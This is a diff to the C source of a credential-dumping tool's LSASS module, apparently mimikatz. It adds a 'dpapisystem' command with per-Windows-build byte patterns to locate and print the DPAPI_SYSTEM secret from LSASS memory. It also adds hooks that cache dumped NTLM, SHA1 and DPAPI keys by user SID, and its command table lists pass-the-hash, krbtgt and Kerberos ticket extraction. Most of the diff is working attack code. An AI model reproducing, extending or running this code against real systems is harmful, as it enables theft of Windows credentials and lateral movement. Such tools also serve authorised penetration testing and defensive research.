@@ -6,27 +6,28 @@
 #include "kuhl_m_sekurlsa.h"
 
 const KUHL_M_C kuhl_m_c_sekurlsa[] = {
-	{kuhl_m_sekurlsa_msv,		L"msv",				L"Lists LM & NTLM credentials"},
-	{kuhl_m_sekurlsa_wdigest,	L"wdigest",			L"Lists WDigest credentials"},
-	{kuhl_m_sekurlsa_kerberos,	L"kerberos",		L"Lists Kerberos credentials"},
-	{kuhl_m_sekurlsa_tspkg,		L"tspkg",			L"Lists TsPkg credentials"},
-	{kuhl_m_sekurlsa_livessp,	L"livessp",			L"Lists LiveSSP credentials"},
-	{kuhl_m_sekurlsa_ssp,		L"ssp",				L"Lists SSP credentials"},
-	{kuhl_m_sekurlsa_all,		L"logonPasswords",	L"Lists all available providers credentials"},
+	{kuhl_m_sekurlsa_msv,				L"msv",				L"Lists LM & NTLM credentials"},
+	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L"Lists WDigest credentials"},
+	{kuhl_m_sekurlsa_kerberos,			L"kerberos",		L"Lists Kerberos credentials"},
+	{kuhl_m_sekurlsa_tspkg,				L"tspkg",			L"Lists TsPkg credentials"},
+	{kuhl_m_sekurlsa_livessp,			L"livessp",			L"Lists LiveSSP credentials"},
+	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"Lists SSP credentials"},
+	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"Lists all available providers credentials"},
 
-	{kuhl_m_sekurlsa_process,	L"process",			L"Switch (or reinit) to LSASS process  context"},
-	{kuhl_m_sekurlsa_minidump,	L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
+	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
+	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
 
-	{kuhl_m_sekurlsa_pth,		L"pth",				L"Pass-the-hash"},
-	{kuhl_m_sekurlsa_krbtgt,	L"krbtgt",			L"krbtgt!"},
+	{kuhl_m_sekurlsa_pth,				L"pth",				L"Pass-the-hash"},
+	{kuhl_m_sekurlsa_krbtgt,			L"krbtgt",			L"krbtgt!"},
+	{kuhl_m_sekurlsa_dpapi_system,		L"dpapisystem",		L"DPAPI_SYSTEM secret"},
 #ifdef _M_X64
-	{kuhl_m_sekurlsa_trust,		L"trust",			L"Antisocial"},
-	{kuhl_m_sekurlsa_bkeys,		L"backupkeys",		L"Preferred Backup Master keys"},
+	{kuhl_m_sekurlsa_trust,				L"trust",			L"Antisocial"},
+	{kuhl_m_sekurlsa_bkeys,				L"backupkeys",		L"Preferred Backup Master keys"},
 #endif
-	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",	L"List Kerberos tickets"},
-	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",	L"List Kerberos Encryption Keys"},
-	{kuhl_m_sekurlsa_dpapi,				L"dpapi",	L"List Cached MasterKeys"},
-	{kuhl_m_sekurlsa_credman,			L"credman",	L"List Credentials Manager"},
+	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",			L"List Kerberos tickets"},
+	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",			L"List Kerberos Encryption Keys"},
+	{kuhl_m_sekurlsa_dpapi,				L"dpapi",			L"List Cached MasterKeys"},
+	{kuhl_m_sekurlsa_credman,			L"credman",			L"List Credentials Manager"},
 };
 
 const KUHL_M kuhl_m_sekurlsa = {
@@ -420,7 +421,6 @@ KULL_M_PATCH_GENERIC SecDataReferences[] = {
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, {  8, 47}},
 };
 #endif
-
 NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
 {
 	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
@@ -518,6 +518,84 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 			}
 		}
 	}
+}
+
+#ifdef _M_X64
+BYTE PTRN_WI52_SysCred[] = {0xb9, 0x14, 0x00, 0x00, 0x00, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
+BYTE PTRN_WI60_SysCred[] = {0x48, 0x8b, 0xca, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
+BYTE PTRN_WN62_SysCred[] = {0x8b, 0xca, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
+KULL_M_PATCH_GENERIC SysCredReferences[] = {
+	{KULL_M_WIN_MIN_BUILD_2K3,		{sizeof(PTRN_WI52_SysCred),		PTRN_WI52_SysCred},		{0, NULL}, { 21,  -4, 10}},
+	{KULL_M_WIN_MIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SysCred),		PTRN_WI60_SysCred},		{0, NULL}, {-13, -19,  8}},
+	{KULL_M_WIN_MIN_BUILD_7,		{sizeof(PTRN_WI60_SysCred),		PTRN_WI60_SysCred},		{0, NULL}, { -7, -13,  8}},
+	{KULL_M_WIN_MIN_BUILD_8,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-10, -19,  7}},
+	{KULL_M_WIN_MIN_BUILD_BLUE,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-27, -4,   7}},
+};
+#elif defined _M_IX86
+BYTE PTRN_WI51_SysCred[] = {0x00, 0xab, 0x33, 0xc0, 0xbf};
+BYTE PTRN_WI52_SysCred[] = {0x59, 0x33, 0xd2, 0x88, 0x10, 0x40, 0x49, 0x75};
+BYTE PTRN_WI60_SysCred[] = {0x6a, 0x14, 0x59, 0xb8};
+BYTE PTRN_WI62_SysCred[] = {0x6a, 0x14, 0x5a, 0x8b, 0xf2, 0xb9};
+BYTE PTRN_WI63_SysCred[] = {0x6a, 0x14, 0x59, 0x8b, 0xd1, 0xb8};
+KULL_M_PATCH_GENERIC SysCredReferences[] = {
+	{KULL_M_WIN_MIN_BUILD_XP,		{sizeof(PTRN_WI51_SysCred),		PTRN_WI51_SysCred},		{0, NULL}, { -4, -14,  5}},
+	{KULL_M_WIN_MIN_BUILD_2K3,		{sizeof(PTRN_WI52_SysCred),		PTRN_WI52_SysCred},		{0, NULL}, { 27,  -4, 12}},
+	{KULL_M_WIN_MIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SysCred),		PTRN_WI60_SysCred},		{0, NULL}, { 34,   4, 20}},
+	{KULL_M_WIN_MIN_BUILD_8,		{sizeof(PTRN_WI62_SysCred),		PTRN_WI62_SysCred},		{0, NULL}, { 36,   6, 17}},
+	{KULL_M_WIN_MIN_BUILD_BLUE,		{sizeof(PTRN_WI63_SysCred),		PTRN_WI63_SysCred},		{0, NULL}, { 31,   6, 18}},
+};
+#endif
+NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
+{
+	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
+	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
+	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, aLocal = {NULL, &hLocalMemory};
+	PKUHL_M_SEKURLSA_PACKAGE pPackage = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package : &kuhl_m_sekurlsa_dpapi_lsa_package;
+	PVOID pBool = NULL, pShaSystem = NULL, pShaUser = NULL;
+	BOOL fSystemCredsInitialized;
+	BYTE origInit, rgbSystemCredMachine[SHA_DIGEST_LENGTH], rgbSystemCredUser[SHA_DIGEST_LENGTH];
+
+	if(NT_SUCCESS(status))
+	{
+		if(pPackage->Module.isPresent)
+		{
+			origInit = pPackage->Module.isInit;
+			if(kuhl_m_sekurlsa_utils_search_generic(&cLsass, &pPackage->Module, SysCredReferences, ARRAYSIZE(SysCredReferences), &pBool, &pShaSystem, &pShaUser, NULL))
+			{
+				pPackage->Module.isInit = origInit; // trick to use same packages as normal module.
+				aLocal.address = &fSystemCredsInitialized;
+				aLsass.address = pBool;
+				if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(fSystemCredsInitialized)))
+				{
+					if(fSystemCredsInitialized)
+					{
+						kprintf(L"DPAPI_SYSTEM\n");
+						aLocal.address = &rgbSystemCredMachine;
+						aLsass.address = pShaSystem;
+						if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(rgbSystemCredMachine)))
+						{
+							aLocal.address = &rgbSystemCredUser;
+							aLsass.address = pShaUser;
+							if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(rgbSystemCredUser)))
+							{
+								kprintf(L"full: ");
+								kull_m_string_wprintf_hex(rgbSystemCredMachine, sizeof(rgbSystemCredMachine), 0);
+								kull_m_string_wprintf_hex(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
+								kprintf(L"\nm/u : ");
+								kull_m_string_wprintf_hex(rgbSystemCredMachine, sizeof(rgbSystemCredMachine), 0);
+								kprintf(L" / ");
+								kull_m_string_wprintf_hex(rgbSystemCredUser, sizeof(rgbSystemCredUser), 0);
+								kprintf(L"\n");
+							}
+						}
+					}
+					else PRINT_ERROR(L"Not initialized!\n");
+				}
+			}
+		}
+		else PRINT_ERROR(L"DPAPI service not in LSASS memory\n");
+	}
+	return status;
 }
 
 #ifdef _M_X64
@@ -809,7 +887,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags)
+VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
 {
 	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
 	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
@@ -820,9 +898,11 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	PVOID base;
 	DWORD type, i;
 	BOOL isNull = FALSE;
+	PWSTR sid = NULL;
 	
 	if(mesCreds)
 	{
+		ConvertSidToStringSid(pData->pSid, &sid);
 		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
 		{
 			type = flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK;
@@ -855,6 +935,8 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 						kprintf(L"\n\t * SHA1     : ");
 						kull_m_string_wprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
 					}
+					if(sid && (pPrimaryCreds->isNtOwfPassword || pPrimaryCreds->ShaOwPassword))
+						kuhl_m_dpapi_oe_credential_add(sid, NULL, pPrimaryCreds->isNtOwfPassword ? pPrimaryCreds->NtOwfPassword : NULL, pPrimaryCreds->isShaOwPassword ? pPrimaryCreds->ShaOwPassword : NULL, NULL, NULL);
 					break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10:
 					pPrimaryCreds10 = (PMSV1_0_PRIMARY_CREDENTIAL_10) credentials->Buffer;
@@ -880,6 +962,8 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 							kprintf(L"\n\t * SHA1     : ");
 							kull_m_string_wprintf_hex(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
 						}
+						if(sid && (pPrimaryCreds10->isNtOwfPassword || pPrimaryCreds10->ShaOwPassword))
+							kuhl_m_dpapi_oe_credential_add(sid, NULL, pPrimaryCreds10->isNtOwfPassword ? pPrimaryCreds10->NtOwfPassword : NULL, pPrimaryCreds10->isShaOwPassword ? pPrimaryCreds10->ShaOwPassword : NULL, NULL, NULL);
 					}
 					else
 						kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) ((PBYTE) pPrimaryCreds10 + FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, align0) + sizeof(USHORT)));
@@ -888,7 +972,7 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
 					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL) + (pRpceCredentialKeyCreds->unk0 - 1) * sizeof(MARSHALL_KEY);
 					for (i = 0; i < pRpceCredentialKeyCreds->unk0; i++)
-						kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key[i], &base);
+						kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key[i], &base, sid);
 					break;
 				default:
 					kprintf(L"\n\t * Raw data : ");
@@ -1006,12 +1090,16 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 		}
 		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
 			kprintf(L"\n");
+
+		if(sid)
+			LocalFree(sid);
 	}
 	else kprintf(L"LUID KO\n");
 }
 
-VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
+VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase, LPCWSTR sid)
 {
+	PBYTE addr = (PBYTE) *dirtyBase + sizeof(ULONG);
 	if(key && key->unkId)
 	{
 		switch(key->unkId)
@@ -1019,9 +1107,13 @@ VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
 		case 0x00010002:
 		case 0x00010003:
 			kprintf(L"\n\t * NTLM     : ");
+			if(sid)
+				kuhl_m_dpapi_oe_credential_add(sid, NULL, addr, NULL, NULL, NULL);
 			break;
 		case 0x00020002:
 			kprintf(L"\n\t * SHA1     : ");
+			if(sid)
+				kuhl_m_dpapi_oe_credential_add(sid, NULL, NULL, addr, NULL, NULL);
 			break;
 		case 0x00030002:
 		case 0x00030003:
@@ -1030,12 +1122,14 @@ VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
 		case 0x00040002:
 		case 0x00040003:
 			kprintf(L"\n\t * DPAPI    : ");
+			if(sid)
+				kuhl_m_dpapi_oe_credential_add(sid, NULL, NULL, NULL, addr, NULL);
 			break;
 		default:
 			kprintf(L"\n\t * %08x : ", key->unkId);
 		}
-		kull_m_string_wprintf_hex((PBYTE) *dirtyBase + sizeof(ULONG), key->length, 0);
-		*dirtyBase = (PBYTE) *dirtyBase + sizeof(ULONG) + *(PULONG) *dirtyBase;
+		kull_m_string_wprintf_hex(addr, key->length, 0);
+		*dirtyBase = addr + *(PULONG) *dirtyBase;
 	}
 }
 
